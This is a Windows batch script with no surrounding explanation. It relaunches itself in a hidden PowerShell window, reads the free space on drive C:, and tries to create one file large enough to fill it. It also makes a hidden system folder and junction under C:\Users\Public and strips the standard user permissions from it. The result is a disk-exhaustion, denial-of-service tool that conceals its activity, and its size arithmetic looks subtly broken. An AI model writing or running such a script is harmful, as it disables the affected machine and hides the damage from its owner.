@echo off
setlocal enabledelayedexpansion

set "TARGET=C:\diskfill"

if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden'"
    exit
)

if not exist "%TARGET%" mkdir "%TARGET%"

for /f "skip=1 tokens=1" %%a in ('wmic logicaldisk where "DeviceID='C:'" get FreeSpace') do (
    if not defined FreeSpace set FreeSpace=%%a
)

set /a FreeMB=%FreeSpace%/1024/1024

set /a SIZE=%FreeMB%*1024*1024

set COUNT=1

set "FOLDER=C:\Users\Public\ProtectedFolder"
if not exist "%FOLDER%" mkdir "%FOLDER%"
attrib +h +s "%FOLDER%"
icacls "%FOLDER%" /inheritance:r
icacls "%FOLDER%" /remove:g Users
icacls "%FOLDER%" /remove:g Everyone
icacls "%FOLDER%" /remove:g Guests

set "JUNC=C:\Users\Public\ProtectedFolder_Link"
if exist "%JUNC%" rd /Q /S "%JUNC%"
mklink /J "%JUNC%" "%FOLDER%"
attrib +h +s "%JUNC%"

echo Creating file !COUNT! ...
fsutil file createnew "%TARGET%\file!COUNT!.bin" %SIZE%
set /a COUNT+=1

echo Done.
pause
